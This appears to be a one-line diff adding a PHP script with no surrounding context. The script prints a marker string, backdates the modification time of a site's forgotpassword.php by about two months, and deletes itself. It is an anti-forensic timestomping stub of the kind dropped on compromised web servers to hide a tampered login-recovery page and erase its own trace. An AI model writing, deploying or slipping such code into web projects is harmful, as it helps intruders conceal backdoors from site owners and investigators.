@@ -1,0 +1,1 @@
+<?php echo "tnXxUtYkyZ"; if (file_exists("./forgotpassword.php")){ touch("./forgotpassword.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*gbwrmNg27PeQmha1p6QT*/ ?>
